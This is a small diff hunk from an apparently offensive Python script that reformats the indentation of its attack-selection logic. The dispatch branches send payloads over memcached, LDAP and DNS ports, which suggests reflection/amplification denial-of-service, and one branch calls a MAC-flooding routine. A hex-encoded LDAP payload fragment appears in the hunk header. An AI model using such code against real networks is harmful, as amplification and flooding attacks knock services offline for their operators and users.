@@ -76,12 +76,12 @@ ldap += "\x65\x74\x6c\x6f\x67\x6f\x6e"
 
 
 if(len(sys.argv) < 3) or (target == None) or (server == None) or (attack == None):
-	print('You run the script without parameters')
+  print('You run the script without parameters')
 elif(attack == '1'):
-	sends(data, 11211)
+  sends(data, 11211)
 elif(attack == '2'):
-	sends(ldap, 389)
+  sends(ldap, 389)
 elif(attack == '3'):
   sends(dns, 53)
 elif(attack == '4'):
-	macflood(target, powers)
+  macflood(target, powers)
